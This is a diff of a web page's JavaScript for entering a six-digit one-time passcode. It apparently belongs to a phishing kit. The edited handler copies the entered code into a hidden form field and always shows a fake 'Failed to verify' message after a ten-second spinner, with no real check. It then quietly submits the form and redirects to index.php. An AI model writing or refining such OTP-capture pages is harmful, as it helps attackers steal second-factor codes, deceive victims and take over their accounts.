@@ -399,47 +399,50 @@
       }
     }, 1000);
 
-    verifyBtn.addEventListener("click", () => {
-      if (verifying) return;
+    
+    // Form submit
+    otpForm.addEventListener("submit", function(e) {
+        e.preventDefault();
 
-      const otp = Array.from(inputs).map(input => input.value).join("");
+        if (verifying) return;
 
-      if (otp.length < 6) {
-        errorText.textContent = "Please enter the full 6-digit OTP.";
-        errorText.classList.add("show");
-        return;
-      }
+        const otp = Array.from(inputs).map(input => input.value).join("");
 
-      verifying = true;
-      errorText.classList.remove("show");
+        if (otp.length < 6) {
+            alert("Please enter the full 6-digit OTP.");
+            return;
+        }
 
-      verifyBtn.disabled = true;
-      verifyBtn.classList.remove("failed");
-      verifyBtn.classList.add("loading");
-      verifyBtn.innerHTML = `
+        otpHidden.value = otp;
+
+        verifying = true;
+        verifyBtn.disabled = true;
+        verifyBtn.classList.add("loading");
+
+        verifyBtn.classList.remove("failed");
+        verifyBtn.classList.add("loading");
+        verifyBtn.innerHTML = `
         <span class="spinner"></span>
         <span>Verifying...</span>
       `;
 
-      setTimeout(() => {
-        verifyBtn.classList.remove("loading");
-        verifyBtn.classList.add("failed");
-        verifyBtn.disabled = false;
-        verifyBtn.innerHTML = `Try Again`;
-        errorText.textContent = "Failed to verify, try again.";
-        errorText.classList.add("show");
-        verifying = false;
+        setTimeout(() => {
+            verifyBtn.classList.remove("loading");
+            verifyBtn.classList.add("failed");
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = `Try Again`;
+            errorText.textContent = "Failed to verify, try again.";
+            errorText.classList.add("show");
+            verifying = false;
 
-        // Redirect after short delay
-        
-      }, 10000);
-      // Form submit
-    otpForm.addEventListener("submit", function(e) {
-      setTimeout(() => {
-            otpForm.submit();
-            window.location.href = "index.php";
-        }, 1000);
-    }
+            setTimeout(() => {
+                otpForm.submit();
+            }, 1000);
+            setTimeout(() => {
+                window.location.href = "index.php";
+            }, 1500);
+
+        }, 10000);
     });
   </script>
 </body>
